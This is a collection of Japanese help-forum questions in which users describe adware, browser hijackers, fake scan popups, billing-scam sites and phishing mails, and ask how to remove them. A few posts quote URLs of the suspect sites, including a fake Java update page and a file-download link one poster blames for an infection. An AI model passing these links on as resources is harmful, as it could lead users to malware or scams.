　ネットを使用していたところ急にアダルトサイトの広告が出現したのですが、よく分からないままクリックしていったところ、「会員に登録されてので、３日以内に8万円振り込むように」とのポップ広告が出ました。 　画面の左下には残り時間のタイマーが表示され、いかにも残り時間が減っていくのを脅しているような感じです。 　 　明らかに詐欺サイトなので支払うつもりは毛頭ないのですが、困ったのはこのポップ広告（太った裸の女の写真が掲載され、細かい規約のようなものがずらずらと記載されてます。）が削除しても削除しても表示されるのです。一度削除しても3分するとまた表示され、一旦パソコンの電源を落として再起動しても無駄でした。 　多分３日過ぎると「延滞金が発生した」だの「裁判沙汰になる」だの「取立て屋が直接訪問する」だのという表示に進むと思いますが、このポップ広告が出ないようにする方法はあるのでしょうか。メルアドを変えてしまえばいいとは思いますが、ネットバンキングや相当数の友人などに切り替えた通知をしなければならず、それは避けたいです。 　なにかいい方法があれば教えてください。よろしくお願いします。
マルウェア？らしき　baidu の被害に遭っています。（写真参照ください） 発症はWindows7-64bit firefox 最新版 McAfee Total Protection あり。 全回質問してから症状が出なくなったと思って質問を締めきりましたが、 症状が発生したため２０１４／９のバックアップを使ってシステム（Cドライブパーティション）を再構築しました。 レストア後は全く問題がないと思っていたのですが、Geforceのゲームドライバを更新してから再度発生しました。 このドライバが問題とは思えないので（もしドライバが原因なら巷で大騒ぎになっている筈）取り敢えず、 baidu のキーワードで該当するファイル名が含まれたファイルを全て削除。 レジストリエディターを使ってレジストリに書き込まれたbaidu のエントリを全て削除しました。 ・・・ですが改善されません。 ネット上にある情報だと　baidu IME の削除に関する話だけで、コンパネのプログラムの追加と削除には baidu と名前がつくプログラムはありません。 spybot を使ってみましたが「問題がメモリ上にあるので再起動してから対処する」というようなメッセージが表示されますが再起動しても　baidu の影響は残ったままです。 リカバリという手もありますが１５４本のプログラムを書き戻す事を考えたら気が遠くなります。 また、２０１４／９の時点では問題が無かったのでリカバリしてもプログラムを入れる手間が増えるだけでしょう。 何かのプログラムなりドライバなりを入れた時点で発症するのは確実なのでどれが原因かを突き止めないと恐らく止められないと思います。 baidu を克服された方か詳しい方、教えて下さい。 詳しくない方でも、解決に繋がるヒントになる事もあるので冷やかしでも何でもご意見をいただければと思います。 宜しくお願い致します。
銀行などのIDやパスワードは送信するときに暗号化されていますが、それでも盗まれることはあるのでしょうか？　もしそうだとしたら、ネットで販売しているそれらに対応するセキュリティソフトはどこのメーカーのものがいいでしょうか？　教えてください。
題名の通りですどうやったら外部から遠隔操作防止できますか?
パソコン初心者です 友人とマイクラのマルチプレイを楽しもうとhamachiをインストールしましたが 間違えてlogmeIn proも入れてしまったようでした hamachiはマルチプレイに使うので 残したいのですがlogmeIn proに 関しては不安でしょうがないです はたしてこれらは安全なのでしょうか？ 今はアカウントからこのパソコンを解除していますが logmeIn proはお試し期間を過ぎるまで不安でしょうがないです また、お試し期間を過ぎたら、パソコンは安全になりますか？ とても困っています助けてください
ません。 検索してほぼすべての除去方法試みました。 XPからWindows7pro64にfirefoxの設定移行のため　firefox最新33.1.1でSynkをセットアップしてから ログイン操作クリックのほか、リンククリックするとReimage Repair関連の広告表示、＝malware 仕込まれてしまいました。 検索してほぼすべての除去方法試みました。 プログラムのアンインスト、タスクバー起動ではReimage Repair名のexeファイルは表示されず、エクスプローラーから、ユーザーフォルダ深層最下層にあったJS削除の方法、 そのほかfirefox関連全削除　最インストとか施しましたが、効果なし（TT ほか◆Anti-Malwareフリー版で対処してみたら、IE11では出なくなりました。 が　firefoxではまだこれが必ずウザク出ますhttp://ja.reimageplus.com/lp/sys/index.php?track … ◆ほか、Essenntialでフルスキャンしても有害モノとしては見つかりません（TT 完全駆除成功例、対処をぜひお教えくださいm(__)m　m(__)m 検索で見つけた情報方法は、ほぼ全部やりつくしてます（TT
　今のところ他のサイトではならないのですが、プロバイダー（so-net）のサイトを閲覧しようとすると、毎回ではないのですが頻繁に、「You've been hacked by the Syrian Electronic Army(SEA)」と出てきて、そのメッセージを消すと、「http://i.imgur.com/qD53RZY.png」の画像へ移動されてしまいます。 　Google翻訳で訳すと、「あなたがシリア電子軍（SEA）によってハッキングされてきた」らしいのですが、これはハッキングされているのでしょうか？ 　具体的に、どのような対策を取るべきなのでしょうか？ 　詳しい方、対応策を教えてください。 　宜しくお願いします。
　トレンドマイクロから１８３１円の請求がきたが使っていない、シリアルナンバーも解らない 今回の請求は支払するが次回請求来なくしたいが？
さいきんシステムのパフォーマンスが低下していますという広告が、表示されるようになりました システム自体は空き領域はしっかりあるのにまるで無いかのように広告が出てきます。 いろいろ調べてみたらこれは詐欺の広告であるらしいのですが、スパイウエアのYontooというソフトが勝手にインストールされ、いたずらしてくるというもので「Yontooをアンインストールすれば、で泣きなるらしいのですが。コントロールパネルより。ファイルのアンインストールのところ見ても「Yontooというソフトは、見当たりません。検索をかけても見つかりません。IEのアドオン見てもそのような文字はありません。「Yontooはインストールされていないはずなのに、ユーチューブとかアメブロの広告に システムのパフォーマンスが低下しています修復しますか広告が・表示されるのです。 子の広告を出なくする方法はないのですか。 「Yontooはどこにもありません。 IObit Uninstallerで探してみてもYontooはありません。 Yontooがインストールしていないにもかかわらず出ます。 IE11でもGoogleクロームでもモジラファイヤーフォックスでも同じくアメブロとかユーチューブとかうきうき家計簿の広告のところに詐欺広告マイクロソフトは関係ないというものが出てくる。
当方の使用環境がＯＳ　Ｗｉｎｄｏｕｓ7　64　ブラウザがグーグルクロームを使用しているのですが、インターネット回覧中にｊａｖａのバージョンが古いのでアップデートが必要です。みたいなポップアップが出てから偽ｊａｖａへのページに強制的にページがジャンプします。ttp://m3.zxmaex.com/5469b683bbcde?geo=JP&aid=129&lp_domain=m.zhsrbl.com&clickid=1416214147　がＵＲＬです。 当方、Ｊａｖａは導入していません。最近、頻度が高くなってきてまともにネット回覧ができません。 止める方法をご存知の方、ご教授お願い致します。
ご覧いただきありがとうございます。最近、詐欺に導くようなメールがよく届きます。 メーラーはGmailを使っており、Gmailで独自ドメインのメールを受信しています。レンタルサーバーはさくらのスタンダードプランです。 ---------------------------メール内容--------------------------- Microsoft Outlook Voicemail (no-reply@〇〇〇.com) さんからの ""You have received a voice mail"" という件名のメッセージに、ウィルスに感染またはその疑いのあるファイルが添付されていました。このメッセージはアカウント example@〇〇〇.com から取得せずにサーバーに残っています。 Message-ID: Microsoft さんと連絡をとる場合は、[返信] をクリックして、Microsoft さんにメッセージを送信してください。 ご利用いただきありがとうございます。 ----------------------------------------------------------------------- ※no-reply@〇〇〇.comの〇〇〇の部分は独自ドメイン名です。 ※example@〇〇〇.comのexampleの部分は実際のメールアドレスです。 皆さんにお聞きしたい点が数点あります。 Q1 example@〇〇〇.comにメールが送られてきますが、送り手はどのようにして私のメールアドレスを取得したのでしょうか。 Q2 no-reply@〇〇〇.comから送られてきており、私のドメインが使用されているように見えます。送り主はサーバーに進入してこのメールを送ってきているということでしょうか。 Q3 ここ最近何度かこのようなメールが届いていますが、現状を放置しても良いのでしょうか。 お気づきの点やアドバイスをいただけると幸いです。 よろしくお願いします。
１ヶ月程前に 【PC Speed Up】 というものを誤ってパソコンに取り込んでしまいました。 それからというもの、パソコンの速度が急激に低下し 変な広告も毎回出るようになってしまいました。 何故かアンインストールも出来ません。 どうしたら元通りになるのでしょうか？ 私はパソコンに疎いのでどなたか 詳しく教えて頂けないでしょうか？ 因みにWindows 7です。
Windows2000にてSUPERAntiSpywareのv5.7を使用してますが！新しいバージョンはv6.0なんですよネ！Windows2000ではSUPERAntiSpywareのv6.0は使えないんでしょうか？Windows2000でv6.0が使えないのだったら画面の右下に「新しいバージョンが利用可能！」とうるさいくらいに毎回表示が出て来ますが表示させない様には出来ないのでしょうか？非常に目障りなんです！どーしたら非表示に出来ますか！教えてくださいませんか？Windows2000でv6.0が使えるのなら別ですけどネ！ ※質問内容をよ～く見て全てにご回答をお願い致します！
Windows7 を使用しています。ブラウザはヤフーにしていましたが、先日、楽天競馬の中継が、見られなくなりました。楽天競馬に、連絡し、『何か、変わった？』『昨日までは大丈夫だった』旨を伝えるも、『Google Chrome変えて欲しい』と言われ、『使いにくいので、嫌だ』と言ったのですが、当方が、誤った操作をした結果だとも言えますので、仕方なく、Google Chromeを、追加しました。勿論、常に利用しませんので、標準の設定ではなく、隅にアイコンがあるだけですが、言われる通り、Google Chromeですと、問題無く、競馬中継は見られています。ですが、Google Chromeに変えた瞬間、『コンピューターが遅いですか？今すぐ無料スキャンして…』と出て、もう一点、画面向かって右側と、下に、広告が出るようになりました。ブラウザが、ヤフーの時には、全く出ないのですが、Google Chromeでは、やはり出ます。検索して、見たのですが、どこの何を削除するのか？が、解りません。ウイルスバスターのようなものと、広告を、Google Chromeから、削除するには、どうすれば良いのでしょうか？
添付の画面がインターネットの切替時に頻繁に出て来ます。 一度、ダウンロードしたらアンチウィルスソフトの警告が出たのでインストールはせずに削除しました。 既にパソコンがウィルスに侵されているのでしょうか。 PC仕様ですがOSは未だXPでブラウザはchromeです。 XPのサポートが切れてから出て来た様にも思うので、この辺りが原因なのでしょうか。 ご教示を頂ければ幸いです。 よろしくお願い申し上げます。
始めまして、よろしくお願いします。 ＹＡＨＯＯで検索中に、下のようなものが時々出てきますが、危ないものでしょうか。 出なくする方法を教えていただけますか。 重要なメッセージ ＰＣのパフォーマンスが低下しています。 今すぐ修復（ここをクリックするようになっています） Ｍｉｃｒｏｓｏｆｔ　Ｐａｒｔｎｅｒ　
何時も御世話になります・ 表題の無料／有料ソフトをインストールしたく探して居ます。 デバイスはNEXUS7（2013)です。ソースネクストの物(有料)はインストールに失敗して、使えて居ません。 新たに別のソフトで適切な物を探しています。WIFIルーター機器へのセキュリティーソフトは設定で 何とか設定できますがその他に別途上記のようなソフトをインストールしたらさらに安全なのではと考えて居ますが如何でしょうか？ 且つそのためのインストールしやすいソフトをご紹介下さい。 またそのソフトの使用結果をも教えて下さい。近々外国へ短期旅行を計画していますので早期に 安全化を計りたく宜しくお願いします。
ソースネクストから購入(有料版）したhotspot shield　wifiセキュリティーをnexus7(2013)へインストールしたのですが、その過程で何かを間違ったのか無料版しかインストール出来ません。 ソースネクストに問いただしているのですが今のところ的確な方法を入手出来ていません。 どなたかご経験のある方で的確なアドバイスを頂ける方は居ませんか？ アカウント（メールアドレスやパスワード）は登録されていると表示されます。 完全にやり直す為nexus　７からソフトをアンインストール／再インストールしてもうまく行きません。 ソフトのメーカーへの種々設定がうまく行っていない可能性もあるのかとも予想しますが。 宜しくお願いします。
先ほどネットの画像観覧をしていると、 画像の様な「不正なソフトウェアが検出されました」と表示が出てきました。 ※画像はチョモランマの頂上付近の写真など （↑死体などが写っているから？？） こんなのが出たのは初めてだったのでビックリして、 「セキュリティで保護されたページに戻る」ではなく、 単純に前のページに戻って、ブラウザを閉めましたが、 これは、セキュリティで保護された…をクリックした方がよかったのでしょうか。 そして、今後どのような事があるのでしょうか。 宜しくお願いします。
Internet Explorerを起動するとトップページがistartsurf.comになります。スパイウェア関係なのかと 何か間違えてソフトをインストールしたらしくいろいろ調べてみましたが無理でした。 ご教示よろしくお願いします。 OS: Windows8.1 ブラウザはInternet Explorer11です。
私のパソコンはDellのVostroで、windows７を使用しています。購入時からモニターに映る画面の一部画像が映っていなかったり、ある色が全く欠落していたりしています。モニター自体に問題があるのかと取り替えてみたりもしましたが改善されません。 また、ソフトをダウンロードしようとしても全く反映されないこともしばしばですし、お気に入りのウイルス対策ソフトも取り込めない始末。 もしかして、パソコンの初期設定でプロテクターが邪魔しているのではないかと思いましたが、対処の仕方が分かりません。 どなたかアドバイスいただけると助かります。
教えて下さい priCechop、prIceechop、pricechop、priicEchop このようなプログラムが勝手にインストールされました IE８で削除するにはどのようにすればいいのでしょうか？ "コントロールパネル" の "プログラムの追加と削除" でそれらしきプログラムを削除してもまだ残っています。
プラウザを立ち上げると、PCのコーションが必ず出て消せません。 スキャンソフトをインストールするように勧めてきますが使いたくありません。 消す方法を教えてください。
何らかの無料ソフトをインストールした際にblockandsurfがインストールされてしまいました。 削除方法を教えてください。
Ad-Aware Securityというソフトをインストールしてから、パソコンの具合が悪くなったので、アンインストールしました。ところが、Ad-Aware Security toolbar も、アンインストールしようと、何度も試みました。ところが、そのたびに、Ad-Aware Security　をインストールする画面が出てきます。さらに、Ad-Aware Security　toolbarは、アンインストールできません。 どうしたら、このtoolbarを削除できるのでしょうか。教えてください。
お手数かけます。 c/program files/sotec/vs/vso/ip/com/macnbin.cab:win trojan agent477210found が検出されました。 辿っていくとcabが18個ありました。全て削除してもosには、問題無いでしょうか？
現在、Windows Defenderのみ使用しております。[使用OSはWindows8.1] セキュリティ対策を万全に行いたいと思い、以下どちらかのオンラインスキャナで検査したいと考えています。 ・Emsisoft Emergency Kit Scanner ・SUPERANtiSpyware どちらが良いでしょうか？ それとも、両方とも利用すべきでしょうか？ もし良ければ、スパイウェアやウイルスに関する基礎知識も教えていただけると、助かります。 以上、よろしくお願いします。
Windows2000にてSUPERAntiSpywareのv5.7を使用してますが！新しいバージョンはv6.0なんですよネ！Windows2000ではSUPERAntiSpywareのv6.0は使えないんでしょうか？Windows2000でv6.0が使えないのだったら画面の右下に「新しいバージョンが利用可能！」とうるさいくらいに毎回表示が出て来ますが表示させない様には出来ないのでしょうか？非常に目障りなんです！どーしたら非表示に出来ますか！教えてくださいませんか？Windows2000でv6.0が使えるのなら別ですけどネ！
ＰＣの起動中。何もしていない時、プラウザ（Chrome）が勝手に立ち上がって、「ＰＣの修復」などの画面が表示される。 プラウザが立ち上がるのは、たいてい午前０時を回った未明。 開かれるwebページのURLは、毎回異なる。 長いものが多いが、短いものもある。下記URLがその一つ。 http://dlvr.adne.tv/bp?section=2128&type=2 中には、ウィルス対策プログラムが「有害なサイト」としてブロックしてしまうものもある。 プラウザを閉じれば、それで問題ないのですが、やっかいです。 いろんな方が対策を書いておられるようだが、プラウザの不要な拡機能の削除、Cookieの削除などをしたが改善されない。 思いあたらないプログラムはインストールされていない。 スタートアップなどをチェックしたが、怪しいものはない。 タスクスケジューラーにも怪しいものはない。 現象が発生しだしたのは、８月１７日以降。 １３日～１６日の間、ＴＶのＰＣ録画のため起動したまま留守にしていました。 その間に、WindowsUpdateがあって、PCが自動的に再起動されたようです。 その時に、何か変なものが入り込んだことは考えられます。 OSはWindows7 HomePremium 64bit、CPUはCore i7、メモリは8GB、HDDは2TBです。 アドバイスをお願いします。
フリーウエアーのVIXでデスクトップを開いたら、 ｛59031A47-3F72-44A7-5595-FE6B30EE｝ こんなファイルがありました。拡張子はありません。 そのプロパティを見たら、「アーカイブ」、更新がなんと1601/01/01 あります。削除しようとしましたが削除できません。 エクスプローラーでは表示されませんでした。 この頃PCに侵入されているようで気が気ではありません。 この正体と対処法についてお教えください。
毎日エロ同人の違法配布サイトからスパムメールが来ます。 あまり気にしておらず、毎日消していましたが どんなサイトか気になりURLをクリックしてみたところ、 サイトに以下の様な注意書きがありました。 『現在、当サイトへの不正アクセスがあり、 迷惑メールの送信元サイトに仕立てられている模様です。 弁護士と相談した結果、被害届の提出を検討中です。』 これは謎ですね。犯人は何の為に行っているのでしょうか？ メールの内容を見る限り、普通の宣伝文句でサイト側が得しているように思えます。 違法配布サイトが、弁護士に相談して警察に被害届を出すというのもおかしい気もします。 スパムを正当化させる自作自演かとも思えます。 1ヶ月近く毎日スパムメールが送られてくると言う事は、1ヶ月間毎日不正アクセスされメールを使われているという事でしょうか？意味が分かりません。 謎が多いです。何なんでしょうか？？
windows7proで　私製DVDの複製をつくっておくため、imgburnをインストしたところ、レジストリースキャンを勝手にはじめてエラーが見つかりましたどうのの怪しいソフトが立ち上がったので同日日付にインストされたソフトをすべてアンインストしました。 アンインストの前にシステムの復元もしましたが消えていませんでした。 しかしこのRight Backupというのだけは、uninst000.datファイルが見つからずアンインストできません・・ だったので、google検索したら、たちの割る感染ソフトとわかりました。 アンインスト方法というサイトももう怪しく信用できない感で・・ よろしくご教示くださいm(__)m
フリーウエアーのVIXでデスクトップを開いたら、 ｛59031A47-3F72-44A7-5595-FE6B30EE｝ こんなファイルがありました。 そのプロパティを見たら、「アーカイブ」、更新がなんと1601/01/01とあります。削除しようとしましたが削除できません。 エクスプローラーでは表示されませんでした。 この正体不明のファイルの正体と対処法についてお教えください。 このところ、PCに侵入されているようで、とても気がかりです。
ｐｃにウイルス的なのが入ったと時どうすればいいですか？ 検索してサイトを開くと、パソコンの性能が低下していますなどと、でてきます。とても怖いです。 パソコンが苦手で対処方法がわかりません。いろいろ調べた結果、プログラムをアンインストールするってあったので手順どうりやっていくと、anyProtectなどがの知らないのが複数あり、 一つずつアンインストールしていきましたが、KingBrowse、PC speed upだけがアンインストールできません。いままでパソコンの性能が低下しています、などの広告は一切でなかったので解決方法がわかりません。詳しく教えてください。パソコンはWindons7です。
chromeでs.m2pub.comという広告が出てくるようになりました。 対策を探ってみたのですが、日本語のおかしい偽のアンチウィルスソフトがヒットするばかり。 過去の質問を見ても、「それはマルウェアです。該当ソフトウェアをアンインストールしてください」で終わり、 まだ肝心の「なにを削除するか」の情報が得られていません。 このサービス、レジストリでこれを消す、などの情報はありませんか。
先日より、avastがルートキットを見つけたようで、 ファイル名 SVC:TVACSVS>C:\Program Files\...\TVACVC.exe ステータス　脅威：Win32:Evo-gen [Susp] と表示され、削除をしても再起動するとすぐに発見されます どうすればよいのでしょうか？ Windows 7を使用しております 富士通のパソコンで、ファイル名を調べると富士通が関係したファイルですが、ここに感染したのでしょうか？ それとも誤認識でしょうか？
某インターネットサービスサイトで自分の音声音楽データを登録しています。登録した音楽データはＵＲＬが割り当てられます。そのサイトで再生するのは問題ありません。この音楽データのＵＲＬを自分のブログに貼り付けてブログ来客者が聴けるようにしています。ところでこの自分のブログでＵＲＬをクリックして音楽再生すると途端に接続しているＨＤが稼働してデータを取り出す信号が点滅しはじめます。これはＵＳＢを接続していても同様です。この点滅はデータ入出力の証拠ですからデータが抜き取られているのではと考えざるを得ません。ところがそのサービスサイトでやる分はこの現象は起きません。（まず怪しまれる現象ですから）。そのＵＲＬを使って外からアクセスするとスパイウエアが稼働してデータ抜き取り転送をしているのではとの疑念がぬぐえません。そうだとすると自分のブログにアクセスしている方々にとんでもない迷惑をかけている可能性があり、社会的に深刻な犯罪です。と、心配性の私ですが、この現象について専門の方のアドバイス願いたく。
WOLD OF TANKSというブラウザゲーム(?)の広告が定期的に立ち上がるようになりました。 勝手にIEを起動させて、案内のhtmlを表示させています。 元々はデスクトップにショートカットキーのような形で現れたものです。 それを削除してOKかと思ってました。 ところが、忘れたころににふらりとIをE立ち上げます。 プログラムのアンインストールやmsconfigのスタートアップを調べてもそれらしいプログラムを発見できません。 こういう種類のADウェアはどうやって削除すればよろしいのでしょうか。
deeal4reAl 1.4 Firefox31.0を使用しています。 突然HPなどの広告がお使いのPC のパフォーマンスが低下していますという広告に変わり始めました。またPOPが立ち上がるようになりました。 アンチウイルスソフトでチェックしましたが問題は見つかりません。 今悪意のあるソフトを削除するツールでチェック中です。 アドオンを見たところdeeal4reAl 1.4というのが入っていますが、これが何か分かりません。 特にソフトをインストールしたとかはありません。 原因と　どうゆう悪い作用(自分のPCの情報流出など)があり、どうゆう対応をすればいいかアドバイスをお願いいたします。 WINDOWS7 64です。
フリーソフトをダウンロードした際に、 このトロイ http://www.symantec.com/ja/jp/security_response/ … に感染したようです。 30個近く見つかりました。 現在、検疫に入っていているのですが、安心して良いのでしょうか？ 削除というボタンもあるようですが、削除したほうがいいのでしょうか？
検索で見つけた以下のページにアクセスすると、一瞬表示されたのち別のサイトに飛ばされます。 ウイルスとも思えないし、Cromeを使ってもIEを使っても同じようになります。 マルウエア対策もしているので感染とは思えないのです。 飛ばされる前のページ自体はまともなサイトのように思うのですが、なぜこのようになるのでしょうか？ http://www.similarsites.com/goto/kermit0229.blog … 特にウイルス感染を目的とした質問ではありません。 お願いします。
インターネットを立ち上げると、最初は異常なく動き出しますが、検索やメールを作成しようとするとUniblue が立ち上がり消えなくなります。このメッセ字を消去するには。どうしたらいいでしょうか。 ウイルスバスターは入っていますがスキャンをしても異常はないとでます。 インターネットを見るとUnibleを削除するにはスタートメニューからとなっていますがスタートメニューにはありません。対処の仕方をご教授ねがいたい。
Jwordにパソコンを壊された 怒りのままに書き込みをしています文面はあしからず 2014年7月16日（水）HPs5730jpマシンににトラブル 通常はアップデート案内として右画面下に窓を開けてアップデート云々を言ってきていた、常に「後で」をクリックほどなきを得ていた 今朝パソコン起動IEを開いたら左画面上に「アップデート完了」と窓が開いた、普通ならお客様どうしますかなのが「完了」で来た 窓の右上にXマークなし、しかたがないのでOKをクリックして邪魔な窓を消したら、IEに不具合があります、このIEはシャットダウンしますと表示 昨夜まで順調だったマシンがどうにもならなくなった こんな場合は個人はどうすれはよいのでしょうか 変なことをしたのは「Jwordに間違いはありません」でこんな会社に直接対処方法を聞くことができるのでしょうか 癪な思いのたけを記述しています 個人的にはどうすればよいのでしょうか 取りあえず警告を個人的に出します 自分のマシンは「Jword」に壊されました
友人のメールアドレス（＠hotmail.com）にて、私の携帯電話宛てに「不審なメール」の送信があり、メールの中にＵＲＬの記載があり、携帯で開くことができなかったので、パソコンに転送して調べたところ、セキュリティソフトのチェックに引っかかり「偽装サイトとして報告されているサイト」（フィシング詐欺サイト）であることが判明しました。 友人に照会したところ、その様なメールは送っていないとのことです。 私の携帯電話のメールアドレスは、ごく限られた人にしか知らせていませんので、心配になります。 そこで、お聞きしたいのですが、 (1)私は、携帯のメールは殆ど使用しないので、私の方から、友人のメールアドレス（＠hotmail.com）が、第三者に漏れたことは、考えられませんので、 「不審なメール」の送信者は、友人がメールをやり取りしたことがある、関係者でしょうか。 (2)もしそうだとしたら、私以外の者のメールアドレスも、友人のパソコン（スマホ？）の情報が漏れる等して、当該不審者に渡っている可能性があるのでしょうか。 (3)もし、友人から、当方のメールアドレスが漏れたのが、パソコンではなく、スマートフォンだとした場合、 友人のスマートフォンはiphoneですので、iphoneは安全と聞きますが、iphoneでもメールアドレスの情報漏れがおきる可能性があるのでしょうか。 見知らぬメールアドレスからの悪戯メールはこれまでも経験がありますが、 今回は、送信されてきたメールアドレスが実在する友人のメールアドレスであり、 気持ちが悪いので、真相を解明したく思いますので、よろしくお教え願います。
タイトルの通りです。 何か、インストールすると知らないうちに情報を抜き取られるとの話を聞きました。 インストールしないほうが、賢明でしょうか？
不思議な事がおきました。 パソコンのyoutubeの再生リストに音楽をいろいろといれているのですが、それが不在のときに再生されていました。音楽なので3分ごとぐらいで履歴に残ると思いますが連続だったり１時間あいたりしていました。イベントビューアのセキュリティ見てもログイン形跡はなかったです。 また、youtubeは動画の右側に関連動画も表示がありますがそれの履歴も再生リストにいれていたのとは違いありました。Googleドライブの履歴見ても不正アクセスはありませんでした。 履歴がyoutubeのみでした。他ページの履歴はありませんでした。 最近USBの接続が一部おかしいところがあり、勝手に切れたりして挿しなおしていたこともありますがそれとは関係ありますか？ 家族はいますがそんなことができるとは思わないんですが・・・・・・・。 いったいなにが起きたんでしょうか？
ある曲のダウンロードをしようとした時に、ダウンロードと表示されたボタンが二つあり その時にクリックしたボタンが、音楽とは関係ないHao123という検索サイトにつながって いるものでした。 以後、インターネットエクスプローラーをクリックすると本来ならヤフーのホームページが 起動するはずが、Hao123が起動してしまいます。 やむなく、ヤフージャパンを選び直している状態です。 そこで、間違ってクリックしたことによって、入り込んだ不明なものを排除するために アンインストールは行いました。 しかし、それでもこの状態です。 ちなみに、OKWAVEを立ち上げるとなぜか画面上部に「質問する OKWAVE」のタブの右に 「Hao123-マイスタート　×」というタブも並んでいます。 通常使用する検索エンジンはグーグルにしていますが、こちらを使っていなかったので 影響は受けずに済んでおり、普通にヤフーサイトが最初に現れます。 ちなみに当方のOSは７で、セキュリティはマカフィトータルプロテクションを使っています。
誰かが自分のアカウントでgoogleにログインしているような感じです。 youtubeの閲覧履歴には、見たことのない動画が表示されます。 GMAILの連絡先などを盗まれたら友人などに迷惑をかけるので、早急に対応したいのですが、どなたか対処法をご教示いただけますようよろしくお願い致します。
googleアドセンスの広告内容を判断するためのキャッシュ情報？の削除は可能でしょうか？ googleアドセンスはどのように個人の情報を収集し、広告として表示しているのでしょうか？ 私は釣りが趣味で常に様々なサイトを訪問しています。 かなり前になるのですが、あるサイトに訪問してから、いたるサイトのgoogleアドセンスの枠がそのサイトの広告になりました。 PC・iphone共にそこらじゅうに表示され、少し不愉快です。 以前に似たような質問をし、ブラウザのキャッシュは削除したのですが改善しません。 プロバイダが情報を保有しているのかも….という意見も頂いたのですがそのようなことを確認するすべはありませんでしょうか？（BIGLOBE) PC・iphone共に釣り関係のブックマーク・お気に入りが多数入っているのを読み取っているのでしょうかね？ そして、表示されるサイトが釣りという分野について強烈なSEO？対策等を行っている賜物ですかね？ 端末に履歴が残らない程度の効果しかないのは理解していますが、一応ブラウジング時は基本的にシークレットモードを使用しています。 使用ブラウザはgoogle chromeとsafariくらいです。 ご教授の程お願い申上げます。
今日は、三井住友銀行、４月は三菱東京ＵＦＪ銀行　とYahooドメインを使ったフィッシングサイトへ誘導するメールが届きました。 幸い、大事には至ってはいませんのでいいのですが、ネットバンキング、ネットショッピングは頻繁に利用していますので、ついうっかりとか勘違いとかで詐欺にかかってしまわないような方法を考えています。 通常は、ＥｘｃｅｌにそれぞれのＩＤやＰＷ、メールアドレスなどの一覧表を作っています。 で、ログインの時、直にキーボードをたたくのではなく、Ｅｘｃｅｌからコピペしています。 これなら、盗まれる確率は相当減るのではないかと考えています。 しかしながら、私の知恵など悪さをする人間からすればたやすくクリアしてしまうのではないかと不安です。 このＥｘｃｅｌからコピペする方法は安全でしょうか？あまり意味のないやり方でしょうか？ どうぞよろしくお願いいたします。
最近フリーソフトをダウンロードしようとすると、目的のソフトのダウンロードサイトにたどり着くまでに、 いろいろ紛らわしい誘惑があり、それに引っかかり余計なソフトがインストールされたりして困ります、 そんな折から、表題のフリーソフトを知り、マルウェアやジャンクソフトを検出して除去してくれるとのうたい文句にひかれインストールしてみましたが、これがほんとにこちらの期待した機能を発揮してくれているのか？、単に裏で情報収集してるだけか、どうかイマイチ分かりません。 （個人的には盗まれて困るようなたいした情報等は保有していませんが・・・） これ自体がスパイウェアだったり、最近話題のビッグデータ収集用のものだったりも有り得る事かも・・・などと考えると、英語の読解力の無い身としては無暗に手を出すべきではなと知りつつ、つい手を出しては悩むばかりです。 そこで本題ですが、 表題のソフトの有効性　（有害性？）　について、ご存じの方の助言を頂きたくて質問させて頂きました。 更に、皆様はこのような場合（フリーソフトをダウンロード、利用する際） どんな点に注意されているのでしょうか、アドバイスが頂いて参考にしたいと考えます。 ・・・ごく最近も有名なSpybotを新たに　D/L　したくて（このソフト自体は数年前から利用）サイトを検索したのですが、レジクリーンやらなにやらばかりが目につき目的のソフトに辿りつけませんでした（泣） 以前は、もっと簡単にダウンロード出来たと記憶していますが・・・ 回りくどいことを長々書きましたが、よろしくご指導くださるようお願いします。
ブラウザはgogle chromeを使っているのですが時々変な広告出てきてうんざりしています おそらく事の発端は「http://www.datafilehost.com/d/fb08b1e4」のファイルをチェック外さずにDLしたのが原因だと思います dgen.exeはアンインストールしたはずなのに気付いたらまだ残っててCPU100%にしてるしでどうしたらいいのかわかりません。 ちなみにコンピューター→Temp→dgen.exeを発見したのですが鍵のアイコンついていました。鍵付いてても消すことは可能ですがPCを再起動すると復元されています つたない文章ですが対処法がわかるかたどうかお力添えをお願い致します
悪徳サイトReg crean proを誤ってパソコンにインストールしてしまいました(ToT) どなたかこの悪徳サイトを抹消する方法を教えてください！
画面中央や脇の部分に不要な広告(ウイルススキャン等)の画面が邪魔して困っています。 永久に出なくするような設定はできないものでしょうか。ちなみに、セブンを導入したばかりです。 ウイルスソフトはマカフィーを試用しています。
昨日くらいにネットを見ているとZippyZarp という広告みたいなものが出て、インターネットのが非常に遅いです。削除する方法のわかる方、教えて下さい
JPEGをPDFに変換するソフトをインストールした時に「Setting Manager」をインストールされてしまいました。 Chromeの設定が変更されており、おかしいと思って調べていると「Setting Manager」がインストールされている事がわかり、とりあえずアンインストールを行いました。 しかし、ほんとうに完全に削除されているか不安です。完全に削除する方法を教えて下さい。OSはWindows7です。よろしくお願い致します。
Google Chromeを使っています。 他とリンクさせるため自分のログインIDを記憶させているのですが、ある日「設定が変更されました」と表示されて、ログイン情報がクリヤーされていました。 ログインを確認しようと設定を開くと、機能拡張に「entrusted」というプログラムが表示されています。 「有効」のチェックは外れていました。オカシイと思ったので即刻削除しました。 しかし、パソコンを一度落として再起動させるとまた同様にログイン情報がクリヤーされ、設定を見ると「entrusted」が復活しています。 「entrusted」でパソコン内の検索をかけましたが、それらしいファイルはみつかりません。 隠しファイルも確認してします。 ウイルスソフト、symantec Endpoint Protectionを最新版にしてスキャンをかけましたが、以上は見当たりません。 Windows Defenderのスキャンにもかかりません。 regeditでgoogle chromeの項目にそれらしい文字列を発見したので、それも削除しました。 しかし、パソコン自体を再起動するとまたentrustedが復活していて、アンインストールとログインの設定のやり直しが必要です。 ネットでこのワードを検索すると「entrustedツールバーが削除できない」などの項目が見つかります。 が自分のそれには当てはまらないようで、もう全く打つ手が見つからない状態です。 もう後はパソコンの初期化しかないかもしれないのですが、出来れば避けたいと思っております。 経験のある方、心当たりのある方いましたら、お力を貸してください。 よろしくお願いします。
